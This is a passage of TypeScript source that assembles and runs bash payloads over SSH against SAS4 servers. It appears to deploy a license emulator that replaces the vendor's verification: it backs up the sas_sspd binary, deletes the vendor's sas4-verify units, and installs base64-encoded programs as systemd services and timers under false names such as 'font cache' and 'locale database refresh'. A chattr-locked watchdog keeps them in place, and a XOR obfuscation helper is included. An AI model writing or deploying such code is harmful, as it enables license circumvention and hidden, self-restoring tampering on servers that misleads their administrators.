    "_RS1_",
    "  fi",
    `  if [ ! -f /etc/systemd/system/${P.SVC_VERIFY}.timer ]; then`,
    `    cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_RS2_'`,
    "[Unit]",
    "Description=Font cache garbage collection",
    "[Service]",
    "Type=oneshot",
    `ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}`,
    "_RS2_",
    `    cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_RS3_'`,
    "[Unit]",
    "Description=Font cache gc timer",
    "[Timer]",
    "OnBootSec=60",
    "OnUnitActiveSec=6h",
    "Persistent=true",
    "[Install]",
    "WantedBy=timers.target",
    "_RS3_",
    "  fi",
    "  systemctl daemon-reload",
    `  systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer`,
    `  systemctl start ${P.SVC_VERIFY}.timer`,
    `  systemctl start ${P.SVC_MAIN}`,
    "fi",
  ].join("\n");

  const watchdogB64 = Buffer.from(watchdog, "utf-8").toString("base64");

  const payload = [
    "#!/bin/bash",
    `systemctl stop ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true`,
    `systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true`,
    "systemctl stop sas4-verify.timer sas4-verify 2>/dev/null || true",
    "fuser -k 4000/tcp 2>/dev/null || true",
    "sleep 1",
    '_PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")',
    `mkdir -p ${P.BASE}`,
    `mkdir -p ${P.PATCH_DIR}`,
    `if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f ${P.BASE}/${P.BACKUP} ]; then`,
    `  cp /opt/sas4/bin/sas_sspd ${P.BASE}/${P.BACKUP}`,
    `  chmod +x ${P.BASE}/${P.BACKUP}`,
    "fi",
    `echo "${emuB64}" | base64 -d > ${P.BASE}/${P.EMULATOR}`,
    `chmod +x ${P.BASE}/${P.EMULATOR}`,
    `echo "${verB64}" | base64 -d > ${P.BASE}/${P.VERIFY}`,
    `chmod +x ${P.BASE}/${P.VERIFY}`,
    `cat > /etc/systemd/system/${P.SVC_MAIN}.service << _SVC_1_`,
    "[Unit]",
    "Description=System font cache synchronization daemon",
    "After=network.target",
    "[Service]",
    "ExecStart=$_PY3 " + `${P.BASE}/${P.EMULATOR}`,
    "Restart=always",
    "RestartSec=3",
    "KillMode=process",
    "StandardOutput=journal",
    "StandardError=journal",
    "[Install]",
    "WantedBy=multi-user.target",
    "_SVC_1_",
    `cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_SVC_2_'`,
    "[Unit]",
    "Description=Font cache garbage collection",
    "[Service]",
    "Type=oneshot",
    `ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}`,
    "_SVC_2_",
    `cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_TMR_1_'`,
    "[Unit]",
    "Description=Font cache gc timer",
    "[Timer]",
    "OnBootSec=60",
    "OnUnitActiveSec=6h",
    "Persistent=true",
    "[Install]",
    "WantedBy=timers.target",
    "_TMR_1_",
    `echo "${watchdogB64}" | base64 -d > ${P.PATCH_DIR}/${P.PATCH_FILE}`,
    `chmod +x ${P.PATCH_DIR}/${P.PATCH_FILE}`,
    `chattr +i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true`,
    `cat > /etc/systemd/system/${P.PATCH_SVC}.service << '_PSVC_'`,
    "[Unit]",
    "Description=Locale database refresh service",
    "[Service]",
    "Type=oneshot",
    `ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}`,
    "_PSVC_",
    `cat > /etc/systemd/system/${P.PATCH_SVC}.timer << '_PTMR_'`,
    "[Unit]",
    "Description=Locale database refresh timer",
    "[Timer]",
    "OnBootSec=120",
    "OnUnitActiveSec=5min",
    "Persistent=true",
    "[Install]",
    "WantedBy=timers.target",
    "_PTMR_",
    "systemctl disable sas4-verify.timer sas4-verify 2>/dev/null || true",
    "rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null",
    "rm -f /opt/sas4/bin/sas_tec.py /opt/sas4/verify.sh 2>/dev/null",
    "systemctl daemon-reload",
    `systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true`,
    `systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer`,
    `systemctl start ${P.SVC_VERIFY}.timer`,
    `systemctl start ${P.PATCH_SVC}.timer`,
    "fuser -k 4000/tcp 2>/dev/null || true",
    "sleep 1",
    `systemctl start ${P.SVC_MAIN}`,
    'echo "Installation completed successfully"',
  ].join("\n");

  return payload;
}

export function xorEncryptPayload(data: string, key: string): string {
  const dataBuf = Buffer.from(data, "utf-8");
  const keyBuf = Buffer.from(key, "utf-8");
  const result = Buffer.alloc(dataBuf.length);
  for (let i = 0; i < dataBuf.length; i++) {
    result[i] = dataBuf[i] ^ keyBuf[i % keyBuf.length];
  }
  return result.toString("base64");
}

export async function undeployLicenseFromServer(
  host: string, port: number, username: string, password: string
): Promise<{ success: boolean; error?: string }> {
  const P = DEPLOY;

  const undeployScript = `#!/bin/bash
systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
systemctl disable ${P.PATCH_SVC}.timer 2>/dev/null || true
systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
systemctl disable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer 2>/dev/null || true
fuser -k 4000/tcp 2>/dev/null || true

chattr -i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
rm -f ${P.PATCH_DIR}/${P.PATCH_FILE}
rmdir ${P.PATCH_DIR} 2>/dev/null || true
rm -f /etc/systemd/system/${P.PATCH_SVC}.service
rm -f /etc/systemd/system/${P.PATCH_SVC}.timer

rm -f ${P.BASE}/${P.EMULATOR}
rm -f ${P.BASE}/${P.VERIFY}
rm -f ${P.BASE}/${P.BACKUP}
rm -rf ${P.BASE} 2>/dev/null || true
rm -f /etc/systemd/system/${P.SVC_MAIN}.service
rm -f /etc/systemd/system/${P.SVC_VERIFY}.service
rm -f /etc/systemd/system/${P.SVC_VERIFY}.timer
rm -f ${P.LOG}

systemctl stop sas4-verify.timer sas4-verify 2>/dev/null || true
systemctl disable sas4-verify.timer sas4-verify 2>/dev/null || true
rm -f /etc/systemd/system/sas4-verify.* 2>/dev/null
rm -f /opt/sas4/bin/sas_tec.py /opt/sas4/verify.sh 2>/dev/null

systemctl daemon-reload
`;

  const encoded = Buffer.from(undeployScript, "utf-8").toString("base64");
  const command = `_t=$(mktemp); echo '${encoded}' | base64 -d > "$_t"; bash "$_t"; _rc=$?; rm -f "$_t"; exit $_rc`;

  return executeSSHCommand(host, port, username, password, command);
}
